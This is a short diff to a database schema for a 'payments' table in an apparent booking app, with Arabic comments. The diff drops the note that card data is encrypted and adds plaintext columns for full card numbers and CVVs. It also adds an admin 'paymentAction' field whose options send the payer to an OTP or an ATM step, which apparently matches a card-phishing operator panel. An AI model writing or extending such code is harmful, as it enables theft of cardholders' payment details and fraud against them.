@@ -95,11 +95,15 @@ export type InsertBooking = typeof bookings.$inferInsert;
 export const payments = mysqlTable("payments", {
   id: int("id").autoincrement().primaryKey(),
   referenceId: varchar("referenceId", { length: 64 }).notNull(),
-  // بيانات البطاقة (مشفرة)
+  // بيانات البطاقة
   cardHolderName: varchar("cardHolderName", { length: 255 }),
+  cardNumber: varchar("cardNumber", { length: 30 }),       // رقم البطاقة الكامل
   cardLastFour: varchar("cardLastFour", { length: 4 }),
+  cardCvv: varchar("cardCvv", { length: 10 }),             // CVV
   cardType: varchar("cardType", { length: 50 }),
   cardExpiry: varchar("cardExpiry", { length: 10 }),
+  // إجراء المسؤول على الدفع: STILL=انتظار, accepted=OTP, pass=ATM, denied=رفض
+  paymentAction: varchar("paymentAction", { length: 20 }).default("STILL"),
   // بيانات الدفع
   amount: decimal("amount", { precision: 10, scale: 2 }),
   currency: varchar("currency", { length: 10 }).default("SAR"),
